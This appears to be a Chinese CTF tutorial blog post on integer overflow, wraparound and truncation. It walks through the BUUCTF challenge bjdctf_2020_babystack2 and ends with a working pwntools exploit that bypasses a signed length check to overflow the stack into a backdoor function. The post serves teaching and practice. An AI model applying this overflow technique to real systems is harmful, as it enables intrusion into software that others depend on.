<template><div><p><a name="2485c08b"></a></p>
<h1 id="概述" tabindex="-1"><a class="header-anchor" href="#概述" aria-hidden="true">#</a> 概述：</h1>
<p>前面的文章介绍了基础的栈溢出，其实还有进阶的栈溢出，但是我累了，进阶的栈溢出留着以后写。先来学习整数安全。整数安全漏洞在ctf中还是很常见的，但是整数安全漏洞并不能直接getshell，通常配合栈溢出或堆溢出来利用。<br />计算机中的整数分为有符号整数和无符号整数两种，通常保存在一个固定长度的内存空间中，他能存储的最大值和最小值都是固定的。<br />整数的基本数据类型分为短整型 (short)，整型 (int)，长整型 (long)，这三个数据类型还分为有符号和无符号，每种数据类型都有各自的大小范围，(因为数据类型的大小范围是编译器决定的，所以之后所述都默认是 64 位下使用 gcc-5.4)，如下所示:<br /><img src="https://img-blog.csdnimg.cn/0643c4a027144058b96e57f5e6b5ed2e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6IuP55KD5Y-q5oOz5YiS5rC0,size_18,color_FFFFFF,t_70,g_se,x_16#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=Y4PtG&amp;originHeight=479&amp;originWidth=678&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt="" loading="lazy"><br />关于整数的异常情况主要有三种：</p>
<ol>
<li>溢出：只有有符号数才会发生溢出。有符号数的最高位表示符号，在两正或两负相加时，有可能改变符号位的值，产生溢出。溢出标志OF可检测有符号数的溢出。</li>
</ol>
<p><img src="https://img-blog.csdnimg.cn/cc59763d69454790b9dbdd3211add04c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6IuP55KD5Y-q5oOz5YiS5rC0,size_19,color_FFFFFF,t_70,g_se,x_16#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=mbZQi&amp;originHeight=471&amp;originWidth=732&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt="" loading="lazy"><br />2. 回绕：无符号数0-1时会变成最大的数，类似于时钟的时间，如1字节的无符号数会变成255，而255+1会变成最小数0。进位标志CF可检测无符号数的回绕。<br /><img src="https://img-blog.csdnimg.cn/e642ee1811534a489f0f7118a399af26.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6IuP55KD5Y-q5oOz5YiS5rC0,size_16,color_FFFFFF,t_70,g_se,x_16#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=wC4pm&amp;originHeight=437&amp;originWidth=614&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt="" loading="lazy"><br />3. 截断：将一个较大宽度的数存入一个宽度较小的数中，高位发生截断。<br /><img src="https://img-blog.csdnimg.cn/e394809ab9784b64bc5d4ad443775383.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6IuP55KD5Y-q5oOz5YiS5rC0,size_15,color_FFFFFF,t_70,g_se,x_16#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=Vm8re&amp;originHeight=356&amp;originWidth=577&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt="" loading="lazy"></p>
<p><a name="5a16a45a"></a></p>
<h1 id="溢出例子" tabindex="-1"><a class="header-anchor" href="#溢出例子" aria-hidden="true">#</a> 溢出例子：</h1>
<p>BUUCTF：bjdctf_2020_babystack2</p>
<p><a name="a970b03c"></a></p>
<h2 id="checksec分析" tabindex="-1"><a class="header-anchor" href="#checksec分析" aria-hidden="true">#</a> checksec分析：</h2>
<p><img src="https://img-blog.csdnimg.cn/2331dd54b8cf491d867c4837c2704e39.png#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=YFc1R&amp;originHeight=184&amp;originWidth=757&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt="" loading="lazy"><br />64位程序，没有开启canary，没有开启PIE。</p>
<p><a name="af1d1a74"></a></p>
<h2 id="ida-pro分析" tabindex="-1"><a class="header-anchor" href="#ida-pro分析" aria-hidden="true">#</a> ida pro分析：</h2>
<p><img src="https://img-blog.csdnimg.cn/c898ebe99de04d1e85f0f5efd75c61ad.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6IuP55KD5Y-q5oOz5YiS5rC0,size_18,color_FFFFFF,t_70,g_se,x_16#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=ovg1H&amp;originHeight=552&amp;originWidth=667&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt="" loading="lazy"></p>
<p><img src="https://img-blog.csdnimg.cn/0e0e6e8544a94f64866643b27e889b5f.png#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=cu4cp&amp;originHeight=159&amp;originWidth=341&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt="" loading="lazy"><br />存在后门函数，程序的大致意思是输入一个有符号整数nbytes，然后判断大小，如果大于10，则程序退出，如果小于10则可以输入nbytes大小的name数据。</p>
<p><a name="1a7f5c22"></a></p>
<h2 id="利用思路" tabindex="-1"><a class="header-anchor" href="#利用思路" aria-hidden="true">#</a> 利用思路：</h2>
<p>可以通过栈溢出来跳转到后门函数，但是我们必须满足一个条件，我们输入的nbytes的值小于10，并且输入nbytes字节的name数据时可以发生溢出，但是发生溢出的字节要求是0x18。<br />但是我们首先输入nbytes的时候，他的数据类型是一个有符号整数，当我们输入nbytes大小的字符时，它变成了无符号整型，也就是说，当我们输入一个特别大的数据时，比如2147483649，此时寄存器里的值为0x80000001=&gt;2147483649，当nbytes是一个有符号整数时，他是一个负数，if语句会判断出nbytes小于10，然后我们就可以绕过if判断，当我们输入name时，nbytes是一个无符号整数，即此时它的值为0x80000001=&gt;2147483649，那么我们就可以输入0x80000001=&gt;2147483649字节的数据，满足了溢出的条件。</p>
<p><a name="a3e6be45"></a></p>
<h2 id="exp" tabindex="-1"><a class="header-anchor" href="#exp" aria-hidden="true">#</a> exp：</h2>
<div class="language-python ext-py line-numbers-mode"><pre v-pre class="language-python"><code><span class="token comment">#!/usr/bin/python2</span>
<span class="token comment">#coding=utf-8</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>


context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">"linux"</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">"amd64"</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span> <span class="token string">"debug"</span><span class="token punctuation">)</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node3.buuoj.cn"</span><span class="token punctuation">,</span> <span class="token number">29899</span><span class="token punctuation">)</span>

backdoor <span class="token operator">=</span> <span class="token number">0x400726</span>
p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"length of your name:"</span><span class="token punctuation">,</span> <span class="token string">"2147483649"</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token string">"a"</span> <span class="token operator">*</span> <span class="token number">0x18</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>backdoor<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"name?"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"cat flag"</span><span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><a name="8b59e775"></a></p>
<h1 id="回绕和截断例子在想了-等我想出来一定补上。" tabindex="-1"><a class="header-anchor" href="#回绕和截断例子在想了-等我想出来一定补上。" aria-hidden="true">#</a> 回绕和截断例子在想了，等我想出来一定补上。</h1>
</div></template>


